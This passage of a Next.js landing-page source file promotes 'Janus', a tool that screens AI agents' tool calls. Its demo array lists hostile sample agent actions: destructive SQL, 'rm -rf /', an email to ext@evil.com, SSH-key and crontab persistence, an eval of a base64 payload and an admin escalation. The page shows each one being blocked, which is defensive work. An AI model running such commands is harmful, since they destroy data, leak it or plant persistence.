"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import {
  Shield,
  Lock,
  Fingerprint,
  AlertTriangle,
  Activity,
  GitBranch,
  Brain,
  Zap,
  Eye,
  BarChart3,
  BadgeCheck,
  ArrowRight,
  Check,
  X,
  Terminal,
  ChevronRight,
  ExternalLink,
  Copy,
  Globe,
  BookOpen,
  Layers,
  Play,
  Settings,
  FileCode,
} from "lucide-react";
import { Instrument_Serif, Outfit, Fira_Code } from "next/font/google";

/* ═══════════════════════════════════════════════════════════════
   FONTS
   ═══════════════════════════════════════════════════════════════ */

const serif = Instrument_Serif({
  subsets: ["latin"],
  weight: "400",
  style: ["normal", "italic"],
  variable: "--font-serif",
  display: "swap",
});

const sans = Outfit({
  subsets: ["latin"],
  variable: "--font-sans",
  display: "swap",
});

const mono = Fira_Code({
  subsets: ["latin"],
  variable: "--font-mono",
  display: "swap",
});

/* ═══════════════════════════════════════════════════════════════
   PIPELINE ANIMATION DATA
   ═══════════════════════════════════════════════════════════════ */

const PIPELINE_NODES = [
  { id: "inj", name: "Injection", icon: Shield },
  { id: "id", name: "Identity", icon: Fingerprint },
  { id: "perm", name: "Permission", icon: Lock },
  { id: "risk", name: "Risk", icon: BarChart3 },
  { id: "threat", name: "Threat Intel", icon: AlertTriangle },
  { id: "itdr", name: "ITDR", icon: Eye },
] as const;

const SCENARIOS = [
  {
    tool: "execute_sql",
    args: '"DROP TABLE users;"',
    label: "Destructive SQL",
    results: [true, true, true, false] as boolean[],
    verdict: "BLOCK" as const,
    reason: "Destructive SQL pattern",
    score: 94,
  },
  {
    tool: "read_file",
    args: '"/data/sales.csv"',
    label: "Legitimate Read",
    results: [true, true, true, true, true, true] as boolean[],
    verdict: "ALLOW" as const,
    reason: "All checks passed",
    score: 8,
  },
  {
    tool: "execute_code",
    args: '"os.system(\'rm -rf /\')"',
    label: "Shell Injection",
    results: [false] as boolean[],
    verdict: "BLOCK" as const,
    reason: "Injection: system command execution",
    score: 99,
  },
  {
    tool: "send_email",
    args: '"to: ext@evil.com"',
    label: "Data Exfiltration",
    results: [true, true, false] as boolean[],
    verdict: "BLOCK" as const,
    reason: "Permission denied: send_email",
    score: 78,
  },
  {
    tool: "database_query",
    args: '"SELECT name FROM products"',
    label: "Safe DB Query",
    results: [true, true, true, true, true, true] as boolean[],
    verdict: "ALLOW" as const,
    reason: "All checks passed",
    score: 12,
  },
  {
    tool: "write_file",
    args: '"~/.ssh/authorized_keys"',
    label: "SSH Key Injection",
    results: [true, true, true, true, false] as boolean[],
    verdict: "BLOCK" as const,
    reason: "Threat intel: SSH persistence",
    score: 88,
  },
  {
    tool: "api_call",
    args: '"POST /admin/delete-all"',
    label: "Admin API Abuse",
    results: [true, false] as boolean[],
    verdict: "BLOCK" as const,
    reason: "Identity: unverified agent",
    score: 72,
  },
  {
    tool: "search_web",
    args: '"quarterly revenue report"',
    label: "Web Search",
    results: [true, true, true, true, true, true] as boolean[],
    verdict: "ALLOW" as const,
    reason: "All checks passed",
    score: 3,
  },
  {
    tool: "execute_code",
    args: '"eval(base64.b64decode(payload))"',
    label: "Obfuscated Payload",
    results: [false] as boolean[],
    verdict: "BLOCK" as const,
    reason: "Injection: eval + encoded payload",
    score: 97,
  },
  {
    tool: "write_file",
    args: '"/etc/crontab"',
    label: "Cron Persistence",
    results: [true, true, false] as boolean[],
    verdict: "BLOCK" as const,
    reason: "Permission denied: system paths",
    score: 85,
  },
  {
    tool: "api_call",
    args: '"GET /api/health"',
    label: "Health Check",
    results: [true, true, true, true, true, true] as boolean[],
    verdict: "ALLOW" as const,
    reason: "All checks passed",
    score: 5,
  },
  {
    tool: "execute_sql",
    args: '"UPDATE users SET role=\'admin\'"',
    label: "Privilege Escalation",
    results: [true, true, true, true, true, false] as boolean[],
    verdict: "BLOCK" as const,
    reason: "ITDR: privilege escalation attempt",
    score: 82,
  },
];

/* ═══════════════════════════════════════════════════════════════
   HOOKS
   ═══════════════════════════════════════════════════════════════ */

function useReveal(threshold = 0.15) {
  const ref = useRef<HTMLDivElement>(null);
  const [visible, setVisible] = useState(false);
  useEffect(() => {
    const el = ref.current;
    if (!el) return;
    const obs = new IntersectionObserver(
      ([e]) => {
        if (e.isIntersecting) {
          setVisible(true);
          obs.disconnect();
        }
      },
      { threshold }
    );
    obs.observe(el);
    return () => obs.disconnect();
  }, [threshold]);
  return { ref, visible };
}

/* ═══════════════════════════════════════════════════════════════
   PIPELINE VISUALIZATION
   ═══════════════════════════════════════════════════════════════ */

function PipelineViz() {
  const [scIdx, setScIdx] = useState(0);
  const [step, setStep] = useState(-1);
  const [fading, setFading] = useState(false);

  const sc = SCENARIOS[scIdx];
  const blockIdx = sc.results.indexOf(false);
  const lastNodeIdx = blockIdx >= 0 ? blockIdx : sc.results.length - 1;

  useEffect(() => {
    const ts: ReturnType<typeof setTimeout>[] = [];
    setFading(false);
    setStep(-1);

    ts.push(setTimeout(() => setStep(0), 500));

    for (let i = 1; i <= lastNodeIdx; i++) {
      ts.push(setTimeout(() => setStep(i), 500 + i * 750));
    }

    const verdictTime = 500 + (lastNodeIdx + 1) * 750 + 200;
    ts.push(setTimeout(() => setStep(lastNodeIdx + 1), verdictTime));

    const totalTime = verdictTime + 2400;
    ts.push(setTimeout(() => setFading(true), totalTime));
    ts.push(
      setTimeout(() => {
        setScIdx((p) => (p + 1) % SCENARIOS.length);
      }, totalTime + 500)
    );

    return () => ts.forEach(clearTimeout);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [scIdx]);

  const verdictShown = step > lastNodeIdx;
  const isBlock = sc.verdict === "BLOCK";

  const flowPct =
    step >= 0
      ? (Math.min(step, lastNodeIdx) / Math.max(PIPELINE_NODES.length - 1, 1)) * 100
      : 0;

  return (
    <div
      className={`transition-opacity duration-500 ${fading ? "opacity-0" : "opacity-100"}`}
    >
      {/* Header row */}
      <div className="flex items-center justify-between mb-5">
        <div className="flex items-center gap-3">
          <div
            className={`h-2 w-2 rounded-full transition-colors duration-300 ${
              step >= 0 ? "bg-[#5eead4] shadow-[0_0_6px_#5eead480]" : "bg-[#232738]"
            }`}
          />
          <span
            className="text-[13px] font-medium text-[#636880]"
            style={{ fontFamily: "var(--font-mono)" }}
          >
            {sc.label}
          </span>
        </div>
        <div className="flex gap-2">
          {SCENARIOS.map((_, i) => (
            <div
              key={i}
              className={`h-1.5 rounded-full transition-all duration-300 ${
                i === scIdx ? "w-5 bg-[#5eead4]" : "w-1.5 bg-[#232738]"
              }`}
            />
          ))}
        </div>
      </div>

      {/* Tool call */}
      <div
        className={`mb-7 rounded-lg border border-[#1e2233] bg-[#080a11] px-5 py-3.5 transition-all duration-400 ${
          step >= 0 ? "opacity-100 translate-y-0" : "opacity-0 translate-y-2"
        }`}
      >
        <div
          className="flex items-center gap-2 text-[13px]"
          style={{ fontFamily: "var(--font-mono)" }}
        >
          <span className="text-[#636880]">{">"}</span>
          <span className="text-[#fbbf24]">{sc.tool}</span>
          <span className="text-[#4a4e63]">(</span>
          <span className="text-[#5eead4]">{sc.args}</span>
          <span className="text-[#4a4e63]">)</span>
        </div>
      </div>

      {/* Pipeline nodes — desktop */}
      <div className="relative hidden sm:flex items-center px-6">
        {/* Track background */}
        <div className="absolute top-6 left-6 right-6 h-[2px] bg-[#1a1e2a]" />

        {/* Active flow */}
        <div
          className="absolute top-6 left-6 h-[2px] transition-all duration-700 ease-out"
          style={{
            width: `calc(${flowPct}% - ${flowPct > 0 ? 0 : 24}px)`,
            background:
              verdictShown && isBlock
                ? "linear-gradient(90deg, #5eead4, #f87171)"
                : "#5eead4",
            boxShadow:
              step >= 0
                ? `0 0 12px ${verdictShown && isBlock ? "#f8717140" : "#5eead440"}`
                : "none",
          }}
        />

        {/* Nodes */}
        <div className="relative z-10 flex w-full justify-between">
          {PIPELINE_NODES.map((node, i) => {
            const reached = step >= i;
            const processing = step === i && i <= lastNodeIdx;
            const passed = i < sc.results.length && sc.results[i];
            const failed = reached && i < sc.results.length && !sc.results[i];
            const dimmed = i > lastNodeIdx && !verdictShown;
            const Icon = node.icon;

            return (
              <div
                key={node.id}
                className={`flex flex-col items-center transition-all duration-300 ${
                  dimmed ? "opacity-20" : ""
                }`}
              >
                <div
                  className={`relative w-12 h-12 rounded-full flex items-center justify-center border-2 transition-all duration-500
                    ${processing ? "border-[#5eead4] bg-[#5eead4]/10 scale-110" : ""}
                    ${reached && passed && !processing ? "border-[#5eead4]/40 bg-[#5eead4]/5" : ""}
                    ${failed ? "border-[#f87171] bg-[#f87171]/10 scale-110" : ""}
                    ${!reached ? "border-[#232738] bg-[#0e1018]" : ""}
                  `}
                >
                  {(processing || failed) && (
                    <div
                      className={`absolute inset-[-5px] rounded-full border-2 opacity-40 ${
                        failed ? "border-[#f87171]" : "border-[#5eead4]"
                      }`}
                      style={{ animation: "ping 1.5s ease-out infinite" }}
                    />
                  )}
                  {failed ? (
                    <X size={16} className="text-[#f87171]" />
                  ) : reached && passed && !processing ? (
                    <Check size={16} className="text-[#5eead4]" />
                  ) : (
                    <Icon
                      size={16}
                      className={`transition-colors duration-300 ${
                        reached ? "text-[#5eead4]" : "text-[#4a4e63]"
                      }`}
                    />
                  )}
                </div>
                <span
                  className={`mt-3 text-[11px] font-medium tracking-wide transition-colors duration-300
                    ${failed ? "text-[#f87171]" : reached ? "text-[#e4e7ef]" : "text-[#4a4e63]"}
                  `}
                >
                  {node.name}
                </span>
              </div>
            );
          })}
        </div>
      </div>

      {/* Pipeline nodes — mobile (vertical) */}
      <div className="sm:hidden space-y-3 pl-4">
        {PIPELINE_NODES.map((node, i) => {
          const reached = step >= i;
          const passed = i < sc.results.length && sc.results[i];
          const failed = reached && i < sc.results.length && !sc.results[i];
          const dimmed = i > lastNodeIdx && !verdictShown;
          const Icon = node.icon;

          return (
            <div
              key={node.id}
              className={`flex items-center gap-3 transition-opacity duration-300 ${dimmed ? "opacity-20" : ""}`}
            >
              <div className={`relative w-3 flex flex-col items-center`}>
                <div
                  className={`w-3 h-3 rounded-full transition-all duration-300
                    ${failed ? "bg-[#f87171]" : reached ? "bg-[#5eead4]" : "bg-[#232738]"}
                  `}
                />
                {i < PIPELINE_NODES.length - 1 && (
                  <div className={`w-[2px] h-4 mt-0.5 transition-colors duration-300 ${reached ? "bg-[#5eead4]/30" : "bg-[#1a1e2a]"}`} />
                )}
              </div>
              <div className="flex items-center gap-2">
                <Icon size={13} className={failed ? "text-[#f87171]" : reached ? "text-[#5eead4]" : "text-[#4a4e63]"} />
                <span className={`text-xs font-medium ${failed ? "text-[#f87171]" : reached ? "text-[#e4e7ef]" : "text-[#4a4e63]"}`}>
                  {node.name}
                </span>
                {reached && !dimmed && (
                  <span className={`text-[10px] font-bold ${failed ? "text-[#f87171]" : "text-[#5eead4]"}`}>
                    {failed ? "FAIL" : "PASS"}
                  </span>
                )}
              </div>
            </div>
          );
        })}
      </div>

      {/* Verdict */}
      <div
        className={`mt-7 transition-all duration-500 ${
          verdictShown ? "opacity-100 translate-y-0" : "opacity-0 translate-y-3 pointer-events-none"
        }`}
      >
        {isBlock ? (
          <div className="flex items-center gap-3.5 rounded-xl border border-[#f87171]/20 bg-[#f87171]/[0.04] px-5 py-3.5">
            <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-[#f87171]/10">
              <X size={15} className="text-[#f87171]" />
            </div>
            <div>
              <div className="text-[13px] font-bold text-[#f87171]">BLOCKED</div>
              <div className="text-[11px] text-[#636880]">
                {sc.reason} &middot; risk {sc.score}
              </div>
            </div>
          </div>
        ) : (
          <div className="flex items-center gap-3.5 rounded-xl border border-[#5eead4]/20 bg-[#5eead4]/[0.04] px-5 py-3.5">
            <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-[#5eead4]/10">
              <Check size={15} className="text-[#5eead4]" />
            </div>
            <div>
              <div className="text-[13px] font-bold text-[#5eead4]">ALLOWED</div>
              <div className="text-[11px] text-[#636880]">
                {sc.reason} &middot; risk {sc.score}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════════
   CHECKS GRID DATA
   ═══════════════════════════════════════════════════════════════ */

const CHECKS = [
  { p: 5, name: "Prompt Injection", desc: "15+ regex patterns detect injection attempts", icon: Shield, tier: "free" },
  { p: 10, name: "Identity Gate", desc: "Verifies agent identity and session authenticity", icon: Fingerprint, tier: "free" },
  { p: 20, name: "Permission Scope", desc: "Glob-based tool permission enforcement", icon: Lock, tier: "free" },
  { p: 25, name: "Deterministic Risk", desc: "Rule-based risk scoring + pattern matching", icon: BarChart3, tier: "free" },
  { p: 35, name: "Taint Tracking", desc: "Tracks data flow from untrusted sources", icon: GitBranch, tier: "pro" },
  { p: 38, name: "Predictive Risk", desc: "Matches against known attack trajectories", icon: Activity, tier: "pro" },
  { p: 30, name: "LLM Classifier", desc: "Claude Haiku contextual risk assessment", icon: Brain, tier: "pro" },
  { p: 40, name: "Drift Detection", desc: "Detects semantic drift from stated goal", icon: Eye, tier: "pro" },
  { p: 55, name: "Threat Intel", desc: "Matches against known threat signatures", icon: AlertTriangle, tier: "free" },
  { p: 60, name: "ITDR", desc: "Anomaly, collusion, and escalation detection", icon: BadgeCheck, tier: "free" },
];

/* ═══════════════════════════════════════════════════════════════
   PAGE
   ═══════════════════════════════════════════════════════════════ */

export default function LandingPage() {
  const [copied, setCopied] = useState(false);
  const [mobileMenu, setMobileMenu] = useState(false);
  const [checkoutLoading, setCheckoutLoading] = useState(false);

  const handleCopy = useCallback(() => {
    navigator.clipboard.writeText("pip install janus-security");
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }, []);

  const handleStartTrial = useCallback(async () => {
    setCheckoutLoading(true);
    try {
      const res = await fetch("/api/billing/checkout", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });
      const data = await res.json();
      if (data.checkout_url) {
        window.location.href = data.checkout_url;
      } else {
        alert(data.detail || "Failed to start checkout. Please try again.");
        setCheckoutLoading(false);
      }
    } catch {
      alert("Failed to connect. Please try again.");
      setCheckoutLoading(false);
    }
  }, []);

  const revealPipeline = useReveal();
  const revealChecks = useReveal();
  const revealHowItWorks = useReveal();
  const revealDocs = useReveal();
  const revealIntegration = useReveal();
  const revealPricing = useReveal();

  return (
    <div
      className={`${serif.variable} ${sans.variable} ${mono.variable} min-h-screen overflow-x-hidden`}
      style={{
        fontFamily: "var(--font-sans)",
        backgroundColor: "#06080e",
        color: "#e4e7ef",
      }}
    >
      {/* ── Keyframes ─────────────────────────────────────────── */}
      <style
        dangerouslySetInnerHTML={{
          __html: `
            @keyframes ping {
              0% { transform: scale(1); opacity: 0.5; }
              100% { transform: scale(1.6); opacity: 0; }
            }
            @keyframes gradient-shift {
              0% { background-position: 0% 50%; }
              50% { background-position: 100% 50%; }
              100% { background-position: 0% 50%; }
            }
            @keyframes float {
              0%, 100% { transform: translateY(0); }
              50% { transform: translateY(-8px); }
            }
            @keyframes scan {
              0% { top: -2px; opacity: 0; }
              10% { opacity: 1; }
              90% { opacity: 1; }
              100% { top: 100%; opacity: 0; }
            }
            @keyframes blink {
              0%, 49% { opacity: 1; }
              50%, 100% { opacity: 0; }
            }
            html { scroll-behavior: smooth; }
            .reveal-section {
              opacity: 0;
              transform: translateY(24px);
              transition: opacity 0.7s ease, transform 0.7s ease;
            }
            .reveal-section.visible {
              opacity: 1;
              transform: translateY(0);
            }
            .gradient-border-animated {
              background: linear-gradient(135deg, #5eead4, #a78bfa, #60a5fa, #5eead4);
              background-size: 300% 300%;
              animation: gradient-shift 4s ease infinite;
            }
          `,
        }}
      />

      {/* ── Noise overlay ─────────────────────────────────────── */}
      <div
        className="fixed inset-0 pointer-events-none z-[60] opacity-[0.025]"
        style={{
          backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")`,
          backgroundRepeat: "repeat",
          backgroundSize: "128px 128px",
        }}
      />

      {/* ══════════════════════════════════════════════════════════
          NAV
          ══════════════════════════════════════════════════════════ */}
      <nav className="fixed top-0 left-0 right-0 z-50 border-b border-[#1e2233]/60 bg-[#06080e]/80 backdrop-blur-xl">
        <div className="mx-auto flex max-w-6xl items-center justify-between px-6 py-4">
          <a href="#" className="flex items-center gap-2.5">
            <div className="flex h-7 w-7 items-center justify-center rounded-md bg-[#5eead4]/10">
              <Shield size={14} className="text-[#5eead4]" />
            </div>
            <span className="text-[15px] font-semibold tracking-tight">Janus</span>
          </a>

          <div className="hidden items-center gap-7 md:flex">
            {["Pipeline", "Docs", "Integration", "Pricing"].map((label) => (
              <a
                key={label}
                href={`#${label.toLowerCase()}`}
                className="text-[13px] text-[#636880] transition-colors hover:text-[#e4e7ef]"
              >
                {label}
              </a>
            ))}
          </div>

          <div className="hidden items-center gap-3 md:flex">
            <a
              href="https://github.com/AustinRyan/project-sentinel"
              target="_blank"
              rel="noopener noreferrer"
              className="rounded-lg border border-[#1e2233] bg-[#0e1018] px-4 py-2 text-[13px] font-medium text-[#e4e7ef] transition-all hover:border-[#5eead4]/30 hover:bg-[#161923]"
            >
              GitHub
            </a>
            <a
              href="#pricing"
              className="rounded-lg bg-[#5eead4] px-4 py-2 text-[13px] font-bold text-[#06080e] transition-all hover:bg-[#2dd4bf] hover:shadow-[0_0_20px_#5eead430]"
            >
              Get Started
            </a>
          </div>

          {/* Mobile */}
          <button
            className="flex flex-col gap-1.5 md:hidden"
            onClick={() => setMobileMenu(!mobileMenu)}
            aria-label="Menu"
          >
            <span
              className={`block h-0.5 w-5 bg-[#e4e7ef] transition-all ${mobileMenu ? "translate-y-2 rotate-45" : ""}`}
            />
            <span
              className={`block h-0.5 w-5 bg-[#e4e7ef] transition-all ${mobileMenu ? "opacity-0" : ""}`}
            />
            <span
              className={`block h-0.5 w-5 bg-[#e4e7ef] transition-all ${mobileMenu ? "-translate-y-2 -rotate-45" : ""}`}
            />
          </button>
        </div>

        {mobileMenu && (
          <div className="border-t border-[#1e2233] bg-[#06080e] px-6 py-4 md:hidden">
            <div className="flex flex-col gap-4">
              {["Pipeline", "Docs", "Integration", "Pricing"].map((l) => (
                <a key={l} href={`#${l.toLowerCase()}`} className="text-sm text-[#636880]" onClick={() => setMobileMenu(false)}>
                  {l}
                </a>
              ))}
              <a href="#pricing" className="mt-2 rounded-lg bg-[#5eead4] px-4 py-2 text-center text-sm font-bold text-[#06080e]">
                Get Started
              </a>
            </div>
          </div>
        )}
      </nav>

      {/* ══════════════════════════════════════════════════════════
          HERO
          ══════════════════════════════════════════════════════════ */}
      <section className="relative min-h-screen flex flex-col justify-center pt-24 pb-16 sm:pt-28">
        {/* Background effects */}
        <div className="pointer-events-none absolute inset-0">
          <div className="absolute left-1/2 top-[30%] h-[600px] w-[600px] -translate-x-1/2 -translate-y-1/2 rounded-full bg-[radial-gradient(circle,rgba(94,234,212,0.06)_0%,transparent_70%)]" />
          <div className="absolute right-[15%] top-[60%] h-[400px] w-[400px] rounded-full bg-[radial-gradient(circle,rgba(167,139,250,0.04)_0%,transparent_70%)]" />
        </div>

        <div className="relative z-10 mx-auto w-full max-w-6xl px-6">
          {/* Badge */}
          <div className="mb-8 flex justify-center">
            <div className="inline-flex items-center gap-2.5 rounded-full border border-[#1e2233] bg-[#0e1018] px-4 py-1.5">
              <div className="h-[6px] w-[6px] rounded-full bg-[#5eead4] animate-pulse" />
              <span className="text-[12px] font-medium text-[#636880]">
                Open source &middot; 456 tests passing
              </span>
            </div>
          </div>

          {/* Headline */}
          <h1
            className="text-center text-4xl font-normal leading-[1.1] tracking-tight sm:text-5xl md:text-6xl lg:text-7xl"
            style={{ fontFamily: "var(--font-serif)" }}
          >
            Every tool call.
            <br />
            <em className="text-[#5eead4]">Intercepted.</em>
          </h1>

          {/* Sub */}
          <p className="mx-auto mt-6 max-w-xl text-center text-[15px] leading-relaxed text-[#636880] sm:text-[17px]">
            Janus sits between your AI agents and the tools they touch.
            10 security checks. Real-time. Every call. Zero trust.
          </p>

          {/* CTAs */}
          <div className="mt-10 flex flex-wrap justify-center gap-4">
            <a
              href="https://github.com/AustinRyan/project-sentinel"
              target="_blank"
              rel="noopener noreferrer"
              className="group inline-flex items-center gap-2 rounded-xl bg-[#5eead4] px-6 py-3.5 text-[14px] font-bold text-[#06080e] transition-all hover:bg-[#2dd4bf] hover:shadow-[0_0_28px_#5eead430]"
            >
              Get Started Free
              <ArrowRight
                size={15}
                className="transition-transform group-hover:translate-x-0.5"
              />
            </a>
            <a
              href="#pipeline"
              className="inline-flex items-center gap-2 rounded-xl border border-[#a78bfa]/30 bg-[#a78bfa]/[0.06] px-6 py-3.5 text-[14px] font-bold text-[#a78bfa] transition-all hover:border-[#a78bfa]/50 hover:bg-[#a78bfa]/10"
            >
              View Pipeline
              <ChevronRight size={15} />
            </a>
          </div>

          {/* Stats */}
          <div className="mt-14 flex justify-center gap-10 sm:gap-16">
            {[
              { value: "10", label: "Security checks" },
              { value: "<5ms", label: "P99 latency" },
              { value: "100%", label: "Tool call coverage" },
            ].map((stat) => (
              <div key={stat.label} className="text-center">
                <div
                  className="text-xl font-bold text-[#e4e7ef] sm:text-2xl"
                  style={{ fontFamily: "var(--font-mono)" }}
                >
                  {stat.value}
                </div>
                <div className="mt-1 text-[11px] text-[#4a4e63]">{stat.label}</div>
              </div>
            ))}
          </div>

          {/* ── Pipeline Animation Panel ──────────────────────── */}
          <div
            ref={revealPipeline.ref}
            className={`reveal-section ${revealPipeline.visible ? "visible" : ""} mt-16 sm:mt-20`}
          >
            <div className="relative rounded-2xl border border-[#1e2233] bg-[#0a0c13]">
              {/* Panel chrome */}
              <div className="flex items-center gap-2 border-b border-[#1e2233] px-5 py-3">
                <div className="h-2.5 w-2.5 rounded-full bg-[#f87171]/50" />
                <div className="h-2.5 w-2.5 rounded-full bg-[#fbbf24]/50" />
                <div className="h-2.5 w-2.5 rounded-full bg-[#5eead4]/50" />
                <span
                  className="ml-3 text-[11px] text-[#4a4e63]"
                  style={{ fontFamily: "var(--font-mono)" }}
                >
                  janus &middot; security pipeline
                </span>
              </div>

              <div className="p-6 sm:p-8">
                <PipelineViz />
              </div>

              {/* Scan line effect */}
              <div className="pointer-events-none absolute inset-0 overflow-hidden rounded-2xl">
                <div
                  className="absolute left-0 right-0 h-px bg-gradient-to-r from-transparent via-[#5eead4]/15 to-transparent"
                  style={{ animation: "scan 5s linear infinite" }}
                />
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ══════════════════════════════════════════════════════════
          SECURITY PIPELINE GRID
          ══════════════════════════════════════════════════════════ */}
      <section
        id="pipeline"
        ref={revealChecks.ref}
        className={`reveal-section ${revealChecks.visible ? "visible" : ""} relative py-24 sm:py-28`}
      >
        <div className="mx-auto max-w-6xl px-6">
          <div className="mb-14 max-w-2xl">
            <span className="mb-4 inline-block rounded-full border border-[#1e2233] bg-[#0e1018] px-3 py-1 text-[11px] font-bold uppercase tracking-widest text-[#5eead4]">
              Pipeline
            </span>
            <h2
              className="text-3xl tracking-tight sm:text-4xl"
              style={{ fontFamily: "var(--font-serif)" }}
            >
              10 checks. Priority-ordered.
              <br />
              <span className="text-[#636880]">Short-circuits on BLOCK.</span>
            </h2>
          </div>

          <div className="grid gap-3 sm:grid-cols-2">
            {CHECKS.map((check) => {
              const Icon = check.icon;
              const isPro = check.tier === "pro";
              const accent = isPro ? "#a78bfa" : "#5eead4";

              return (
                <div
                  key={check.p}
                  className="group flex items-start gap-4 rounded-xl border border-[#1e2233] bg-[#0a0c13] p-4 transition-all hover:border-[#1e2233]/80 hover:bg-[#0e1018]"
                >
                  <div
                    className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg"
                    style={{ backgroundColor: `${accent}10` }}
                  >
                    <Icon size={17} style={{ color: accent }} />
                  </div>
                  <div className="min-w-0 flex-1">
                    <div className="mb-1 flex items-center gap-2">
                      <span
                        className="text-[10px] font-bold text-[#4a4e63]"
                        style={{ fontFamily: "var(--font-mono)" }}
                      >
                        P{check.p}
                      </span>
                      <h3 className="text-[13px] font-bold text-[#e4e7ef]">{check.name}</h3>
                      <span
                        className="ml-auto shrink-0 rounded-full px-2 py-0.5 text-[10px] font-bold uppercase"
                        style={{
                          backgroundColor: `${accent}12`,
                          color: accent,
                          border: `1px solid ${accent}25`,
                        }}
                      >
                        {check.tier}
                      </span>
                    </div>
                    <p className="text-[12px] text-[#636880] leading-relaxed">{check.desc}</p>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* ══════════════════════════════════════════════════════════
          HOW IT WORKS
          ══════════════════════════════════════════════════════════ */}
      <section
        ref={revealHowItWorks.ref}
        className={`reveal-section ${revealHowItWorks.visible ? "visible" : ""} relative py-24 sm:py-28 border-t border-[#1e2233]/40`}
      >
        <div className="mx-auto max-w-6xl px-6">
          <div className="mb-14 text-center">
            <span className="mb-4 inline-block rounded-full border border-[#1e2233] bg-[#0e1018] px-3 py-1 text-[11px] font-bold uppercase tracking-widest text-[#fbbf24]">
              How it works
            </span>
            <h2
              className="text-3xl tracking-tight sm:text-4xl"
              style={{ fontFamily: "var(--font-serif)" }}
            >
              Three steps to{" "}
              <span className="text-[#5eead4]">zero-trust agents.</span>
            </h2>
          </div>

          <div className="grid gap-6 lg:grid-cols-3">
            {[
              {
                step: "01",
                title: "Install",
                desc: "One pip install gives you the full security pipeline. No infrastructure changes needed.",
                icon: Play,
                color: "#5eead4",
                code: "pip install janus-security",
              },
              {
                step: "02",
                title: "Configure",
                desc: "Define permissions, thresholds, and notification channels in a single TOML file.",
                icon: Settings,
                color: "#a78bfa",
                code: "janus init  # creates janus.toml",
              },
              {
                step: "03",
                title: "Protect",
                desc: "Every tool call passes through 10 security checks in under 5ms. Block, sandbox, or allow.",
                icon: Shield,
                color: "#60a5fa",
                code: "verdict = await guardian.wrap_tool_call(...)",
              },
            ].map((item) => (
              <div
                key={item.step}
                className="group relative rounded-2xl border border-[#1e2233] bg-[#0a0c13] p-7 transition-all hover:border-[#1e2233]/80 hover:bg-[#0e1018]"
              >
                <div className="mb-5 flex items-center gap-3">
                  <span
                    className="text-[32px] font-bold"
                    style={{ fontFamily: "var(--font-serif)", color: `${item.color}30` }}
                  >
                    {item.step}
                  </span>
                  <div
                    className="flex h-10 w-10 items-center justify-center rounded-lg"
                    style={{ backgroundColor: `${item.color}10` }}
                  >
                    <item.icon size={18} style={{ color: item.color }} />
                  </div>
                </div>
                <h3 className="mb-2 text-[16px] font-bold text-[#e4e7ef]">{item.title}</h3>
                <p className="text-[13px] text-[#636880] leading-relaxed">{item.desc}</p>
                <div
                  className="mt-5 rounded-lg border border-[#1e2233] bg-[#080a11] px-4 py-2.5 text-[12px]"
                  style={{ fontFamily: "var(--font-mono)", color: item.color }}
                >
                  {item.code}
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ══════════════════════════════════════════════════════════
          DOCS / QUICK START
          ══════════════════════════════════════════════════════════ */}
      <section
        id="docs"
        ref={revealDocs.ref}
        className={`reveal-section ${revealDocs.visible ? "visible" : ""} relative py-24 sm:py-28 border-t border-[#1e2233]/40`}
      >
        <div className="mx-auto max-w-6xl px-6">
          <div className="mb-14 max-w-2xl">
            <span className="mb-4 inline-block rounded-full border border-[#1e2233] bg-[#0e1018] px-3 py-1 text-[11px] font-bold uppercase tracking-widest text-[#5eead4]">
              Quick Start
            </span>
            <h2
              className="text-3xl tracking-tight sm:text-4xl"
              style={{ fontFamily: "var(--font-serif)" }}
            >
              Secure your agents{" "}
              <span className="text-[#636880]">in 60 seconds.</span>
            </h2>
          </div>

          <div className="grid gap-5 lg:grid-cols-2">
            {/* Python SDK Quick Start */}
            <div className="rounded-xl border border-[#1e2233] bg-[#0a0c13] overflow-hidden">
              <div className="flex items-center justify-between border-b border-[#1e2233] px-5 py-3">
                <div className="flex items-center gap-2">
                  <FileCode size={13} className="text-[#5eead4]" />
                  <span className="text-[12px] font-bold text-[#e4e7ef]">Python SDK</span>
                </div>
                <span className="rounded-full bg-[#5eead4]/10 px-2 py-0.5 text-[10px] font-bold text-[#5eead4]">
                  app.py
                </span>
              </div>
              <div
                className="p-5 text-[13px] leading-[1.9]"
                style={{ fontFamily: "var(--font-mono)" }}
              >
                <div className="text-[#4a4e63]"># 1. Import and configure</div>
                <div>
                  <span className="text-[#60a5fa]">from</span>{" "}
                  <span className="text-[#e4e7ef]">janus</span>{" "}
                  <span className="text-[#60a5fa]">import</span>{" "}
                  <span className="text-[#e4e7ef]">Guardian, JanusConfig</span>
                </div>
                <div className="mt-1">
                  <span className="text-[#e4e7ef]">config</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#e4e7ef]">JanusConfig</span>
                  <span className="text-[#636880]">.</span>
                  <span className="text-[#e4e7ef]">from_toml</span>
                  <span className="text-[#636880]">(</span>
                  <span className="text-[#5eead4]">&quot;janus.toml&quot;</span>
                  <span className="text-[#636880]">)</span>
                </div>
                <div>
                  <span className="text-[#e4e7ef]">guardian</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
                  <span className="text-[#e4e7ef]">Guardian</span>
                  <span className="text-[#636880]">(</span>
                  <span className="text-[#e4e7ef]">config</span>
                  <span className="text-[#636880]">)</span>
                </div>

                <div className="mt-4 text-[#4a4e63]"># 2. Wrap every tool call</div>
                <div>
                  <span className="text-[#e4e7ef]">verdict</span>{" "}
                  <span className="text-[#636880]">=</span>{" "}
